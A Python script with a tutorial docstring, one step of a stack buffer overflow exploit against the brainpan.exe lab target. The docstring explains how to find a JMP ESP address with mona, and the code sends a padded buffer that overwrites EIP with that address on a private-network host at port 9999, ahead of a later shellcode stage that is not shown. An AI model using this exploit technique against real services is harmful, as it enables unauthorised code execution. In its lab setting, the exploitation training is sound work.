''' find_right_module.py: 

For this step of the process, we want to ensure we are targeting the correct module 

In Immunity, with brainpan.exe attached, run '!mona modules'

Look for a module with all "False" entries for every type of protection (brainpan.exe itself in this case)

This is the "right module". Now we need to find a JMP ESP pointer in the right module. Run this command:

    !mona find -s "\xff\xe4" -e brainpan.exe

This command will find a JMP ESP (hex equivalent of this op code is above) in the target module (brainpan.exe).

Copy the address which mona finds. In this case, that address was 0x311712f3.

Paste that address into the script below, but in little endian (reverse) format from how it is listed in mona. 

The goal here is to overwrite the EIP with this address, which is a pointer to a JMP ESP command somewhere in the
target module. When the program tries to return via the EIP, it will actually jump to the ESP (top of the stack)
which will contain our shellcode. Right now it only contains As, but we will insert our malicious shell code in 
the next script (get_root.py). 

To ensure that this step is successful, set a breakpoint in Immunity at the address you found. 

Run Immunity with this breakpoint set, run this script, and make sure that the breakpoint is triggered. 

You can tell whether the breakpoint was reached by looking at the bottom left of the Immunity window. 

If successful, you will see "Breakpoint at brainpan.311712F3" and the execution will be paused. 

If you see this, then congrats! You have successfully overwritten the EIP to point into the right module to a JMP ESP op code. Now all that is left is to insert your malicious shellcode into the buffer (preceded, of course by a NOP sled
starting at the ESP). 

'''

import sys, socket, subprocess
host = "192.168.56.103"
port = 9999

# user input - data from last step in the bof process
offset = int(input("> Input the exact offset (from find_offset.py): ")) 
payload = b'\xf3\x12\x17\x31' 

# precisely overwrite the offset
pattern = b"A"*offset + payload 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # connect 
    s.connect((host, port))
    s.recv(1024)
    # send pattern to target
    s.sendall(pattern)
    print("Sent")
except Exception as e:
    print("Unable to connect "+str(host))
    print(e)
    sys.exit(0)
